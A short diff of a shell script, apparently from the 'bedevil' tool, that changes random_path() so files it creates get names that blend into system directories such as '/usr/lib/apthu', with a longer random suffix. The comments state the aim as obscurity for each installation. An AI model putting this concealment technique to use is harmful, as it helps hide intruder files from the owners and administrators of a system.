@@ -1,6 +1,6 @@
 # my idea behind the use of random_path and random_name is extra obscurity.
-# i.e. no one installation of bedevil will have the same pathnames etc
-#      for newly created files/general paths.
+# i.e. no one setup of bedevil will have the same pathnames etc
+#      for newly created files/general paths as another.
 # now instead of new & random paths being something like '/usr/lib/apt/.$RANDOM',
 # they'll be something a bit more like '/usr/lib/apthu'
 
@@ -38,7 +38,7 @@ random_path(){
         for dir in ${blacklist[@]}; do [[ $target_dir == *"$dir"* ]] && target_dir=""; done
     done
 
-    local rand_chrs=`random '1-3' 1`
+    local rand_chrs=`random '1-5' 1` # get a random number of random characters to append..
     echo -n "$target_dir`random 'a-z' $rand_chrs`"
 }
 
